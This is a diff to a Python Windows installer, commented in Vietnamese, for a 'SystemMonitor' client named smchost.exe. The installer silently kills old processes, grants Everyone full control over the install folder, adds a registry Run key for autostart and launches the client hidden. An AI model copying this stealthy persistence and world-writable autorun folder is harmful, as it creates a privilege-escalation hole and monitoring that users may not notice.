@@ -4,6 +4,8 @@ import shutil
 import subprocess
 import winreg
 import platform
+import time
+import zipfile
 
 def install():
     target_dir = r"C:\Users\Public\SystemMonitor"
@@ -18,39 +20,69 @@ def install():
         
     src_exe = os.path.join(base_path, exe_name)
     src_config = os.path.join(base_path, config_name)
+    dest_exe = os.path.join(target_dir, exe_name)
+    dest_config = os.path.join(target_dir, config_name)
     
     # 2. Tắt tiến trình cũ (nếu có) để tránh khóa tệp tin
     flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
     subprocess.run(["taskkill", "/f", "/im", exe_name], capture_output=True, creationflags=flags)
+    time.sleep(0.5)
     
-    # 3. Tạo thư mục đích nếu chưa tồn tại
+    # 3. Xóa luôn client cũ và giải nén client mới
     if not os.path.exists(target_dir):
         try:
-            os.makedirs(target_dir)
+            os.makedirs(target_dir, exist_ok=True)
+        except Exception:
+            pass
+
+    # Xóa triệt để file client cũ nếu tồn tại
+    if os.path.exists(dest_exe):
+        for _ in range(3):
+            try:
+                os.remove(dest_exe)
+                break
+            except Exception:
+                subprocess.run(["taskkill", "/f", "/im", exe_name], capture_output=True, creationflags=flags)
+                time.sleep(0.5)
+
+    # Giải nén gói zip client (nếu có trong gói cài đặt)
+    for zip_name in ["data.zip", "client.zip", "smchost.zip"]:
+        zip_file = os.path.join(base_path, zip_name)
+        if os.path.exists(zip_file):
+            try:
+                with zipfile.ZipFile(zip_file, 'r') as zf:
+                    zf.extractall(target_dir)
+                break
+            except Exception:
+                pass
+
+    # Sao chép/bung file thực thi client mới (smchost.exe) vào thư mục đích
+    if os.path.exists(src_exe):
+        try:
+            shutil.copy2(src_exe, dest_exe)
+        except Exception:
+            pass
+
+    # Cập nhật file cấu hình nếu có kèm theo
+    if os.path.exists(src_config):
+        try:
+            if os.path.exists(dest_config):
+                try:
+                    os.remove(dest_config)
+                except Exception:
+                    pass
+            shutil.copy2(src_config, dest_config)
         except Exception:
             pass
             
-    # 4. Sao chép tệp tin ứng dụng và cấu hình
-    dest_exe = os.path.join(target_dir, exe_name)
-    dest_config = os.path.join(target_dir, config_name)
-    
-    try:
-        if os.path.exists(src_exe):
-            shutil.copy2(src_exe, dest_exe)
-        if os.path.exists(src_config):
-            # Luôn copy config.ini mới đè lên hoặc khởi tạo
-            shutil.copy2(src_config, dest_config)
-    except Exception:
-        pass
-        
-    # 5. Phân quyền thư mục cho tất cả Users truy cập
+    # 4. Phân quyền thư mục cho tất cả Users truy cập
     try:
         subprocess.run(["icacls", target_dir, "/grant", "Users:(OI)(CI)F", "/T"], capture_output=True, creationflags=flags)
         subprocess.run(["icacls", target_dir, "/grant", "Everyone:(OI)(CI)F", "/T"], capture_output=True, creationflags=flags)
     except Exception:
         pass
         
-    # 6. Thiết lập Registry Run (Khởi động cùng hệ thống)
+    # 5. Thiết lập Registry Run (Khởi động cùng hệ thống)
     reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
     approved_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
     app_name = "smchost"
@@ -97,9 +129,10 @@ def install():
         except Exception:
             pass
             
-    # 7. Khởi động Client chạy ngầm luôn
+    # 6. Khởi động Client chạy ngầm luôn
     try:
-        subprocess.Popen([dest_exe, "-minimized"], creationflags=flags)
+        if os.path.exists(dest_exe):
+            subprocess.Popen([dest_exe, "-minimized"], creationflags=flags)
     except Exception:
         pass
 
